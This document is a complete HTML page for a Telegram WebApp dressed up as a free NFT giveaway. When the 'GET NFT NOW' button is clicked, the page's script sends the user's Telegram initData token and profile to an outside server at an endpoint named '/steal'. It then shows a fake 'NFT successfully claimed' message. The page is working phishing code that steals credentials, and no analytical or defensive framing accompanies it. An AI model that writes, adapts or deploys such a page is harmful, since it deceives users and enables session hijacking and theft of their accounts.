<!DOCTYPE html>
<html>
<head>
    <title>Free NFT Collector</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 20px;
            background-color: #f0f8ff;
        }
        .container {
            max-width: 500px;
            margin: 0 auto;
            padding: 30px;
            background: white;
            border-radius: 20px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
        }
        button {
            padding: 15px 30px;
            font-size: 18px;
            cursor: pointer;
            background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
            color: white;
            border: none;
            border-radius: 50px;
            margin: 20px 0;
            transition: all 0.3s;
        }
        button:hover {
            transform: scale(1.05);
            box-shadow: 0 8px 25px rgba(37, 117, 252, 0.4);
        }
        #status {
            margin-top: 20px;
            padding: 15px;
            border-radius: 10px;
            background: #f8f9fa;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1 style="color: #6a11cb;">🎨 Free NFT Collector</h1>
        <p>Click the button to claim your exclusive NFT</p>

        <button id="get-nft">✨ GET NFT NOW</button>

        <div id="status">
            <p>Status: <span id="status-text">Ready</span></p>
        </div>
    </div>

    <script>
        // 1. Инициализация WebApp (КРИТИЧЕСКИ ВАЖНО)
        Telegram.WebApp.ready();
        console.log("Telegram WebApp initialized");

        // 2. Элементы для отладки
        const statusText = document.getElementById('status-text');
        const button = document.getElementById('get-nft');

        // 3. Проверка поддержки WebApp
        function updateStatus(message, color = 'black') {
            statusText.textContent = message;
            statusText.style.color = color;
            console.log(message);
        }

        // 4. Проверка инициализации
        if (!window.Telegram || !Telegram.WebApp) {
            updateStatus("Error: Telegram WebApp not loaded", "red");
            button.disabled = true;
        } else {
            updateStatus("WebApp initialized successfully", "green");

            // 5. Показываем информацию о пользователе
            const user = Telegram.WebApp.initDataUnsafe.user;
            if (user) {
                updateStatus(`Hello, ${user.first_name || 'User'}!`);
            }
        }

        // 6. Обработчик кнопки
        button.addEventListener('click', function() {
            updateStatus("Requesting NFT access...", "blue");

            Telegram.WebApp.requestAccess('nft', function(accessGranted) {
                if (!accessGranted) {
                    updateStatus("Access to NFT denied", "red");
                    alert("❌ You must grant access to NFT features");
                    return;
                }

                const initData = Telegram.WebApp.initData;
                const user = Telegram.WebApp.initDataUnsafe.user;

                if (!user || !user.id) {
                    updateStatus("User data missing", "red");
                    alert("⚠️ Cannot get user information");
                    return;
                }

                updateStatus("Sending request to server...", "purple");

                // 7. Отправка запроса
                fetch('https://nftsssf-juerasd.amvera.io/steal', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        token: initData,
                        user: user
                    })
                })
                .then(response => {
                    if (!response.ok) {
                        throw new Error(`Server error: ${response.status}`);
                    }
                    return response.json();
                })
                .then(data => {
                    if (data.success) {
                        updateStatus("NFT successfully claimed!", "green");
                        alert("🎉 NFT collected successfully!");
                    } else {
                        updateStatus(`Error: ${data.error}`, "red");
                        alert(`❌ Error: ${data.error || 'Unknown error'}`);
                    }
                })
                .catch(error => {
                    updateStatus(`Error: ${error.message}`, "red");
                    alert(`🚨 Network error: ${error.message}`);
                    console.error("Fetch error:", error);
                });
            });
        });
    </script>
</body>
</html>
